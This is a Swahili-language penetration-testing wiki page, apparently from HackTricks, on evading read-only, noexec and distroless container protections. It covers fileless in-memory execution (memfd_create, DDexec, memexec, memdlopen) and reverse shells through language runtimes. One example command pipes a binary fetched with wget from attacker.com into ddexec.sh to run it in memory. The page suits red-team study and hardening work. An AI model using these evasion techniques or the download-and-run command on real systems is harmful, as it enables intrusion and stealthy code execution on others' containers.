# Kukwepa ulinzi wa FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video

Katika video zifuatazo, mbinu zilizotajwa kwenye ukurasa huu zimeelezwa kwa kina zaidi:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Hali ya read-only / no-exec

Katika container, unaweza kuweka mfumo wa faili wa root kuwa read-only kwa kuweka **`readOnlyRootFilesystem: true`** katika security context.<sup>[[3]](#references)</sup> Kwa mfano:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Kuweka root kuwa read-only hakufanyi volumes zilizowekwa kando ziwe read-only. Docker huchukulia **`/dev/shm`** kama IPC mount, huku chaguo za tmpfs kama `rw` na `noexec` zikiwa mipangilio ya runtime; kagua chaguo za mount za container lengwa kabla ya kutegemea tabia yoyote kati ya hizo.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Kwa mtazamo wa red-team, mchanganyiko huo unaweza kufanya iwe vigumu kupakua na kuendesha binaries ambazo hazipatikani tayari (kwa mfano, backdoors au zana za enumeration).<sup>[[4]](#references)[[5]](#references)</sup>

## Njia rahisi zaidi ya kukwepa: Scripts

Mount ya `noexec` huzuia binaries kwenye mount hiyo kuendeshwa moja kwa moja, lakini interpreter bado inaweza kusoma na kutafsiri script. Kwa hiyo, ikiwa `sh` au `python` ipo, unaweza kuendesha shell au Python script kupitia interpreter hiyo.<sup>[[5]](#references)</sup>

Hili halisaidii pale ambapo zana inayohitajika yenyewe ni binary.<sup>[[5]](#references)</sup>

## Njia za kukwepa kupitia kumbukumbu

Wakati uendeshaji wa moja kwa moja kutoka kwenye path iliyowekwa kama mount umezuiwa, chaguo moja ni kupakia ELF kwenye kumbukumbu na kuiendesha kupitia path ya kumbukumbu. Hii huepusha ukaguzi wa `noexec` kwenye mount hiyo, lakini haiondoi vidhibiti vingine vya kernel, ruhusa au sera.<sup>[[5]](#references)[[6]](#references)</sup>

### Kukwepa kwa FD + exec syscall

Ikiwa scripting runtime inaweza kufikia interface husika ya Linux, inaweza kuunda file descriptor ya muda isiyo na jina inayohifadhiwa kwenye RAM kwa kutumia **`memfd_create(2)`**, kuandika bytes za ELF ndani yake, na kutumia njia ya uendeshaji inayotumia fd. Mradi wa [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) huzalisha code ya Python, Perl au Ruby iliyobanwa na kusimbwa kwa base64 kwa ajili ya workflow hii.<sup>[[6]](#references)[[7]](#references)</sup>

Kwa sasa mradi huu unaeleza matumizi ya Python, Perl na Ruby; PHP au Node zinahitaji mbinu au extension tofauti inayolenga runtime husika. Kwa hiyo, kutokuwepo kwa generator ya lugha fulani hakumaanishi kuwa uendeshaji kutoka kwenye kumbukumbu hauwezekani.<sup>[[6]](#references)[[12]](#references)</sup>

Angalia [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) kwa maelezo mapana zaidi kuhusu uendeshaji wa anonymous-file, mifumo inayohusiana ya staging, pamoja na ukusanyaji wa detection na forensic.

> [!WARNING]
> Executable ya kawaida iliyoandikwa kwenye **`/dev/shm`** bado iko chini ya mpangilio wa **`noexec`** wa mount hiyo; kuifungua tu kupitia file descriptor ya kawaida hakubadilishi sera ya mount.<sup>[[5]](#references)</sup>
>
> Njia halisi ya uendeshaji kutoka kwenye kumbukumbu pia hutegemea runtime, architecture, kernel na ruhusa zinazopatikana.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) huandika stager na loader kwenye mchakato wa shell unaoendelea kupitia **`/proc/self/mem`**, kisha hukabidhi udhibiti kwa code hiyo.<sup>[[8]](#references)</sup>

Hii huwezesha mchakato kupakia binary iliyotolewa bila kuiweka kwanza kwenye filesystem inayoweza kutekeleza binaries.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** inaweza kupakia na **kuendesha** shellcode au binary kutoka kwenye **kumbukumbu**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Kwa maelezo zaidi kuhusu mbinu hii, angalia Github au:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni utekelezaji wa DDexec unaoendeshwa kama daemon. Daemon yake husikiliza maombi yenye arguments na bytes ghafi za programu, hutengeneza mchakato mtoto ili kupakia na kuendesha kila programu, huku mchakato mzazi ukiendelea kuwa server.<sup>[[9]](#references)</sup>

Repository hii ina mfano wa kutumia **memexec kuendesha binaries kutoka kwenye PHP reverse shell** katika [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Ikiwa na lengo linalofanana na DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) ni utekelezaji wa `dlopen()` usiotumia faili kwa shared object au programu. README yake kwa sasa inaeleza msaada wa ARM64, kwa hiyo angalia architecture ya target kabla ya kuitumia.<sup>[[10]](#references)</sup>

## Distroless Bypass

Kwa maelezo mahususi kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii lini, na jinsi inavyobadilisha mbinu za post-exploitation kwenye containers, angalia:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless ni nini

Images za Distroless zina programu pekee na dependencies zake za runtime; images rasmi hazina package managers, shells, na programu nyingine zinazopatikana kwenye Linux distribution ya kawaida.<sup>[[11]](#references)</sup>

Kuweka dependencies hizo pekee kwenye runtime image hupunguza programu zilizopo kwenye production na kiasi kinachopaswa kuchanganuliwa na kufuatiliwa.<sup>[[11]](#references)</sup>

### Reverse Shell

Kwenye distroless container huenda **usipate `sh` au `bash`** kwa ajili ya shell ya kawaida, wala utilities za kawaida kama `ls`, `whoami`, au `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Kwa hiyo, reverse shell ya kawaida inayotegemea shell au enumeration inayotegemea utilities huenda isifanye kazi.<sup>[[11]](#references)</sup>

Ikiwa programu iliyoathiriwa ina language runtime (kwa mfano, Python kwa programu ya Flask au Node.js kwa programu ya Node), RCE bado inaweza kutumia runtime hiyo kwa command channel na kukagua mfumo kupitia APIs zake.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Tumia lugha ya scripting inayopatikana **ku-enumerate mfumo** kwa kutumia uwezo wa lugha hiyo.<sup>[[12]](#references)</sup>

Ikiwa hakuna ulinzi wa **read-only/no-exec**, command channel inaweza kuandika binaries kwenye mount inayoweza kuandikwa na kuendeshwa, kisha kuziendesha; kwanza thibitisha mount options na permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Ulinzi huu ukiwepo, tumia **mbinu za memory-execution zilizo hapo juu** pale runtime, kernel, na permissions zinaporuhusu.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Unaweza kupata **mifano** ya kutumia udhaifu wa RCE kupata **reverse shells** za lugha za scripting na kuendesha binaries kutoka kwenye memory katika [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Kuchunguza Udanganyifu wa Linux Memory kwa Stealth na Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Uvamizi wa siri kwa kutumia DDexec-ng na in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Kusanidi Security Context kwa Pod au Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [Kuendesha docker container](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
